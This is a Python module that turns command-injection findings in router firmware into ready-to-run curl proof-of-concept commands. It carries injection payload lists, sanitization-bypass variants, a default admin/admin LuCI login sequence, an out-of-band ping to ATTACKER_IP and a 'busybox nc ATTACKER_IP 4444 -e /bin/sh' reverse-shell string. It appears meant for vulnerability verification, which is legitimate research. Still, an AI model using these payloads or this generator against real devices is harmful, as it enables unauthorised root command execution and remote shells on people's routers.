"""
PoC generator for confirmed exploit candidates.

Takes the structured exploit candidates from reach_check.py and produces:
  - curl commands (multiple payload variants, URL-safe encoded)
  - OOB verification command (for non-reflected output)
  - risk classification
  - validation notes (sanitization warnings, injection type)

Only generates verification payloads (id / whoami / uname).
No destructive payloads are produced.
"""

import urllib.parse
import re


# ── Payload sets by injection context ────────────────────────────────────────

# origin == 'getenv' AND flow_str shows no intermediate format
# → entire env var IS the command argument
_PAYLOADS_DIRECT = [
    ("id",            "direct execution — no metacharacters"),
    ("id;whoami",     "chained — semicolon separator"),
    ("id$(whoami)",   "command substitution"),
]

# origin == 'fmt_buf' or flow_str shows snprintf → injected into format position
# → input is appended to or embedded in a command template
_PAYLOADS_SUFFIX = [
    (";id",           "semicolon injection after command prefix"),
    ("|id",           "pipe injection"),
    ("$(id)",         "command substitution"),
    ("&&id",          "AND-chain (non-zero exit required)"),
    ("`id`",          "backtick substitution"),
]

# Unknown injection context — try both direct and suffix approaches
_PAYLOADS_GENERIC = [
    (";id",           "semicolon prefix"),
    ("x;id",          "semicolon with dummy prefix"),
    ("$(id)",         "command substitution"),
    ("x|id",          "pipe with dummy prefix"),
]

# OOB: when output is NOT reflected in the HTTP response
_OOB_TEMPLATE  = "{sep}ping -c 1 ATTACKER_IP"
_REVSH_COMMENT = "busybox nc ATTACKER_IP 4444 -e /bin/sh  # reverse shell"

# LuCI authentication steps (OpenWrt / TP-Link with LuCI)
_LUCI_AUTH_STEPS = """\
  # Step 1: Obtain LuCI session token
  TOKEN=$(curl -s -X POST \\
    -d 'luci_username=admin&luci_password=admin' \\
    'http://{host}/cgi-bin/luci/rpc/auth' \\
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('result',''))")

  # Step 2: Use token in exploit request
  curl -v -b "sysauth_http=$TOKEN" \\"""

_GENERIC_AUTH_COMMENT = """\
  # Auth required — obtain a valid session cookie first, then:
  curl -v -b 'session=<YOUR_SESSION_TOKEN>' \\"""


# ── Risk classification ───────────────────────────────────────────────────────

def _classify_risk(flow, reach, result):
    """
    Returns (level: str, label: str) where level is one of:
      CRITICAL  unauthenticated RCE as root
      HIGH      authenticated RCE, or unauthenticated non-root RCE
      MEDIUM    uncertain privilege or partial control
    """
    verdict    = flow.get('verdict', 'UNCERTAIN')
    auth_req   = reach.get('auth_required')
    priv       = result.get('priv', 'root')
    sink       = flow.get('sink_sym', 'system')

    is_rce     = sink in ('system', 'popen', 'execv', 'execve',
                           'execl', 'execle', 'execlp', 'execvp')
    is_root    = priv in ('root', '0')
    unauth     = auth_req is False
    confirmed  = verdict == 'CONFIRMED'

    if unauth and is_root and is_rce and confirmed:
        return 'CRITICAL', 'Unauthenticated RCE as root'
    if unauth and is_rce:
        return 'CRITICAL' if is_root else 'HIGH', \
               ('Unauthenticated RCE as root'
                if is_root else 'Unauthenticated RCE')
    if is_root and is_rce:
        return 'HIGH', 'Authenticated RCE as root'
    if is_rce:
        return 'HIGH', 'Remote Command Execution'
    return 'MEDIUM', 'Command injection (limited impact)'


# ── Injection type and payload selection ─────────────────────────────────────

def _injection_context(flow):
    """
    Classify the injection context from flow metadata.

    Returns one of: 'direct' | 'suffix' | 'format' | 'unknown'
    """
    origin    = flow.get('origin', '')
    flow_str  = flow.get('flow_str', '')
    sanitized = flow.get('sanitized', False)

    if sanitized:
        return 'sanitized'

    # Direct: getenv result IS the argument
    if origin == 'getenv' and 'snprintf' not in flow_str and 'sprintf' not in flow_str:
        return 'direct'

    # Format buffer: snprintf(cmd, template, user_input) → sink
    if origin in ('fmt_buf',) or 'snprintf' in flow_str or 'sprintf' in flow_str:
        return 'format'

    # Network input → suffix or direct
    if origin == 'net_input':
        return 'suffix'

    return 'unknown'


def _select_payloads(ctx):
    """Return (payloads list, separator char) for the given injection context."""
    if ctx == 'direct':
        return _PAYLOADS_DIRECT, ''
    if ctx in ('suffix', 'format'):
        return _PAYLOADS_SUFFIX, ';'
    if ctx == 'sanitized':
        # Sanitization present — try bypass variants
        return [
            ("%0aid",      "newline bypass (if ; is filtered)"),
            ("$(id)",      "command substitution bypass"),
            ("%09id",      "tab separator bypass"),
            (";id #",      "comment-terminated injection"),
        ], ';'
    return _PAYLOADS_GENERIC, ';'


# ── curl command builder ──────────────────────────────────────────────────────

def _build_curl(endpoint, param, payload, method, auth_required, auth_strength):
    """
    Build a concrete curl command for one payload.

    endpoint     — "http://IP/path"
    param        — HTTP parameter name
    payload      — raw payload string (will be URL-encoded for GET)
    method       — 'GET' | 'POST' | 'GET/POST'
    auth_required — True/False/None
    auth_strength — 'strong' | 'weak' | 'none' | 'unknown'
    """
    encoded = urllib.parse.quote(payload, safe='')

    use_post = (method == 'POST')

    if auth_required and auth_strength in ('weak',):
        # Weak auth: include a placeholder cookie
        auth_flag = "-b 'session=REPLACE_WITH_VALID_SESSION' "
    else:
        auth_flag = ''

    if use_post:
        return (f"curl -v -s {auth_flag}"
                f"-X POST -d '{param}={encoded}' \\\n"
                f"  '{endpoint}'")
    else:
        # URL-encode the payload, attach as query param
        sep = '&' if '?' in endpoint else '?'
        return (f"curl -v -s {auth_flag}"
                f"'{endpoint}{sep}{param}={encoded}'")


def _oob_cmd(endpoint, param, method, sep=';'):
    """Build an OOB ping command for out-of-band verification."""
    oob_payload = urllib.parse.quote(f"{sep}ping -c 1 ATTACKER_IP", safe='')
    sep_char = '&' if '?' in endpoint else '?'
    if method == 'POST':
        return (f"curl -v -s -X POST "
                f"-d '{param}={urllib.parse.quote(sep + 'ping -c 1 ATTACKER_IP', safe='')}' "
                f"'{endpoint}'")
    return f"curl -v -s '{endpoint}{sep_char}{param}={oob_payload}'"


# ── Auth scenario builder ─────────────────────────────────────────────────────

def _auth_scenario(reach, endpoint):
    """Return multi-line string describing the auth flow."""
    host = re.search(r'https?://([^/]+)', endpoint)
    h    = host.group(1) if host else '<device>'

    auth_ev = reach.get('auth_evidence', '')

    if 'luci' in auth_ev.lower() or 'LuCI' in auth_ev:
        return _LUCI_AUTH_STEPS.format(host=h)
    return _GENERIC_AUTH_COMMENT


# ── Public API ────────────────────────────────────────────────────────────────

def generate_poc(candidate, target_ip="192.168.0.1"):
    """
    Generate PoC data for a single exploit candidate.

    Parameters
    ----------
    candidate : dict  — entry from reach_check.analyze_reachability()
    target_ip : str   — device IP (default: 192.168.0.1)

    Returns
    -------
    dict with keys:
      risk_level     : 'CRITICAL' | 'HIGH' | 'MEDIUM'
      risk_label     : human-readable risk summary
      inject_ctx     : injection context type
      curl_commands  : list of (payload_desc, curl_cmd_str)
      oob_cmd        : str — out-of-band verification curl command
      expected_output: str
      auth_steps     : str | None — auth instructions for authenticated flows
      notes          : list[str]  — validation and context notes
    """
    result  = candidate['result']
    flow    = candidate['flow']
    reach   = candidate['reach']

    # ── Normalise endpoint URL ────────────────────────────────────────────────
    endpoint = reach.get('endpoint', f'http://{target_ip}/')
    # Replace placeholder host names with target_ip
    endpoint = re.sub(r'https?://[^/]+', f'http://{target_ip}', endpoint)
    if endpoint.startswith('port:'):
        port     = endpoint.split(':')[1]
        endpoint = f'http://{target_ip}:{port}/'

    param  = reach.get('input_param') or 'cmd'
    method = reach.get('input_method') or 'GET'
    if 'QUERY_STRING' in param:
        param = 'cmd'    # generic param when full QUERY_STRING is injected

    auth_req      = reach.get('auth_required')
    auth_strength = reach.get('auth_strength', 'unknown')

    # ── Injection context ─────────────────────────────────────────────────────
    inject_ctx = _injection_context(flow)
    payloads, sep = _select_payloads(inject_ctx)

    # ── Risk classification ───────────────────────────────────────────────────
    risk_level, risk_label = _classify_risk(flow, reach, result)

    # ── curl commands ─────────────────────────────────────────────────────────
    curl_commands = []
    for raw_payload, desc in payloads[:4]:    # limit to 4 variants
        cmd = _build_curl(endpoint, param, raw_payload, method,
                          auth_req, auth_strength)
        curl_commands.append((desc, cmd))

    oob = _oob_cmd(endpoint, param, method, sep)

    # ── Expected output ───────────────────────────────────────────────────────
    priv = result.get('priv', 'root')
    if priv in ('root', '0'):
        expected = "uid=0(root) gid=0(root) groups=0(root)\nroot"
    else:
        expected = f"uid=?({priv}) ...\n{priv}"

    # ── Auth steps ────────────────────────────────────────────────────────────
    auth_steps = None
    if auth_req is True:
        auth_steps = _auth_scenario(reach, endpoint)

    # ── Validation notes ──────────────────────────────────────────────────────
    notes = []
    sink  = flow.get('sink_sym', 'system')

    if inject_ctx == 'direct':
        notes.append(
            f"input is the direct argument to {sink}() — "
            f"no format string, no prefix; payload IS the command"
        )
    elif inject_ctx == 'format':
        notes.append(
            f"input is injected into a format string before {sink}() — "
            f"payload appended to command template; use separator chars"
        )
    elif inject_ctx == 'sanitized':
        notes.append(
            f"sanitization call observed between input and {sink}() — "
            f"try bypass variants (newline, tab, IFS substitution)"
        )
    else:
        notes.append(
            f"injection context uncertain — try both direct and suffix variants"
        )

    if flow.get('sanitized'):
        notes.append(
            "WARN: pipeline detected a sanitization call — "
            "some payloads may be filtered; test bypass variants"
        )

    if auth_req is None:
        notes.append(
            "auth status unknown — request may succeed without credentials; test both"
        )

    priv_str = result.get('priv', 'unknown')
    notes.append(f"binary runs as {priv_str!r} — "
                 + ("full root RCE" if priv_str in ('root', '0')
                    else f"limited to {priv_str} privilege"))

    return {
        'risk_level':      risk_level,
        'risk_label':      risk_label,
        'inject_ctx':      inject_ctx,
        'curl_commands':   curl_commands,
        'oob_cmd':         oob,
        'expected_output': expected,
        'auth_steps':      auth_steps,
        'notes':           notes,
    }
